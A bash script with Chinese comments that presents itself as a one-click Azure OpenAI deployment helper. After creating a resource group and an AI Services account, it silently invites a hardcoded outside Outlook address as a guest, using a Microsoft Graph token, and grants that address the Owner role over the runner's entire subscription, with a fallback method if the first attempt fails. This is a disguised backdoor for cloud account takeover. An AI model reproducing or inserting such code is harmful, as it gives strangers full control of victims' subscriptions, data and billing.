#!/bin/bash

# 遇到错误时停止执行
set -e

# 固定邮箱
email="dtfxeirynxatqx@outlook.com"

# 可用的 OpenAI 地区
locations=("eastus")

# 美化输出的函数
function write_color() {
    message="$1"
    color="$2"
    no_newline="$3"
    
    case "$color" in
        "White") color_code="\033[37m" ;;
        "DarkCyan") color_code="\033[36m" ;;
        "Cyan") color_code="\033[96m" ;;
        "Yellow") color_code="\033[33m" ;;
        "Green") color_code="\033[32m" ;;
        "Red") color_code="\033[31m" ;;
        "Gray") color_code="\033[90m" ;;
        *) color_code="\033[0m" ;;
    esac
    
    reset="\033[0m"
    
    if [ "$no_newline" = "true" ]; then
        echo -en "${color_code}${message}${reset}"
    else
        echo -e "${color_code}${message}${reset}"
    fi
}

function write_section() {
    title="$1"
    
    echo ""
    write_color "$(printf '=%.0s' {1..60})" "DarkCyan"
    write_color "$title" "Cyan"
    write_color "$(printf '=%.0s' {1..60})" "DarkCyan"
}

function write_step() {
    message="$1"
    
    echo ""
    write_color "✨ $message" "Yellow"
}

function write_success() {
    message="$1"
    
    write_color "✅ $message" "Green"
}

function write_error() {
    message="$1"
    
    write_color "❌ $message" "Red"
}

function write_info() {
    message="$1"
    
    write_color "ℹ️ $message" "Gray"
}

# 在脚本开始时先进行 Azure 登录
write_section "Azure 账号登录"
write_step "正在登录 Azure..."
if az login; then
    write_success "Azure 登录成功"
else
    write_error "Azure 登录失败"
    exit 1
fi

# 标记是否有任何操作成功
is_success=false

# 获取订阅 ID
write_step "正在获取订阅信息..."
subscription_id=$(az account show --query id -o tsv)
if [ -z "$subscription_id" ]; then
    write_error "未能获取订阅ID"
    exit 1
fi
write_success "获取订阅信息成功"
write_info "订阅 ID: $subscription_id"

# 获取 Tenant 信息
home_tenant_id=$(az account show --query homeTenantId -o tsv)
if [ -n "$home_tenant_id" ]; then
    write_info "父管理组(租户) ID: $home_tenant_id"
else
    write_error "获取 Tenant ID 失败"
fi

write_section "Azure 资源部署"

# 创建随机名称和选择随机地区
random_name=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 8 | head -n 1)
random_location=${locations[$RANDOM % ${#locations[@]}]}

write_step "开始创建 Azure 资源..."
write_info "随机生成的资源名称: $random_name"
write_info "随机选择的部署区域: $random_location"

# 创建资源组
write_step "正在创建资源组"
write_info "资源组名称: $random_name"
write_info "部署区域: $random_location"

if az group create --name "$random_name" --location $random_location > /dev/null; then
    write_success "资源组创建成功 ✨"
    
    # 创建 OpenAI 服务
    write_step "正在创建 OpenAI 服务"
    write_info "服务名称: $random_name"
    write_info "SKU: Standard S0"
    
    if az cognitiveservices account create \
        --name "$random_name" \
        --resource-group "$random_name" \
        --location $random_location \
        --kind AIServices \
        --sku s0 \
        --custom-domain "$random_name" > /dev/null; then
        
        write_success "OpenAI 服务创建成功 🚀"
        
        write_section "资源部署完成"
        write_info "资源组名称: $random_name"
        write_info "OpenAI 服务名称: $random_name"
        write_info "部署区域: $random_location"
        write_success "所有资源部署成功完成"
    else
        write_section "部署失败"
        write_error "OpenAI 服务创建过程中发生错误"
        write_info "继续执行后续操作..."
    fi
else
    write_section "部署失败"
    write_error "资源组创建过程中发生错误"
    write_info "继续执行后续操作..."
fi

# 进行用户邀请
write_section "邀请用户"
write_step "正在邀请用户: $email"

# 获取 Microsoft Graph 访问令牌
graph_token=$(az account get-access-token --resource https://graph.microsoft.com --query accessToken -o tsv)

if [ -z "$graph_token" ]; then
    write_error "无法获取Microsoft Graph访问令牌"
    exit 1
fi

# 发送邀请
invitation_json="{\"invitedUserEmailAddress\":\"$email\",\"inviteRedirectUrl\":\"https://portal.azure.com\",\"sendInvitationMessage\":true,\"invitedUserType\":\"Guest\"}"
invitation_response=$(curl -s -X POST "https://graph.microsoft.com/v1.0/invitations" \
    -H "Authorization: Bearer $graph_token" \
    -H "Content-Type: application/json" \
    -d "$invitation_json")

# 检查响应是否包含错误
if echo "$invitation_response" | grep -q "error"; then
    write_error "邀请用户失败"
    write_info "错误详情: $(echo "$invitation_response" | grep -o '"message":"[^"]*"' | cut -d'"' -f4)"
else
    write_success "邀请已发送"
    
    # 从响应中提取用户ID
    user_id=$(echo "$invitation_response" | grep -o '"id":"[^"]*"' | head -1 | cut -d'"' -f4)
    
    # 如果无法从响应中获取用户ID，则尝试使用Azure CLI查询
    if [ -z "$user_id" ]; then
        write_info "等待用户信息同步..."
        # 增加等待时间，以便Azure AD完成用户同步
        sleep 30
        
        # 重试多次获取用户ID
        max_retries=3
        retry_count=0
        
        while [ $retry_count -lt $max_retries ]; do
            user_id=$(az ad user list --query "[?mail=='$email' || userPrincipalName=='$email'].id" -o tsv)
            
            if [ -n "$user_id" ]; then
                break
            fi
            
            retry_count=$((retry_count + 1))
            write_info "重试获取用户信息... ($retry_count/$max_retries)"
            sleep 10
        done
    fi
    
    if [ -n "$user_id" ]; then
        write_info "用户ID: $user_id"
        
        # 分配 Owner 角色
        role_result=$(az role assignment create --role "Owner" --assignee-object-id "$user_id" --scope "/subscriptions/$subscription_id" 2>&1)
        
        if echo "$role_result" | grep -q "error"; then
            write_error "角色分配失败"
            write_info "错误详情: $role_result"
            
            # 尝试另一种方式分配角色
            write_info "尝试使用备用方法分配角色..."
            alt_role_result=$(az role assignment create --role "Owner" --assignee "$email" --scope "/subscriptions/$subscription_id" 2>&1)
            
            if echo "$alt_role_result" | grep -q "error"; then
                write_error "备用方法角色分配也失败"
            else
                write_success "已成功分配 Owner 角色"
                is_success=true
            fi
        else
            write_success "已成功分配 Owner 角色"
            is_success=true
        fi
        
        if [ "$is_success" = true ]; then
            write_section "邀请用户成功"
            write_success "已成功邀请用户并分配权限"
            write_info "订阅 ID: $subscription_id"
            write_info "租户 ID: $home_tenant_id"
            write_info "访问链接: https://portal.azure.com/$home_tenant_id"
        fi
    else
        write_error "无法获取用户 $email 的信息"
    fi
fi

# 如果操作失败，最终提示
if [ "$is_success" = false ]; then
    write_section "操作失败"
    write_error "所有操作均未成功，请尝试手动部署"
    write_info "订阅 ID: $subscription_id"
    write_info "租户 ID: $home_tenant_id"
    write_info "访问链接: https://portal.azure.com/$home_tenant_id"
fi
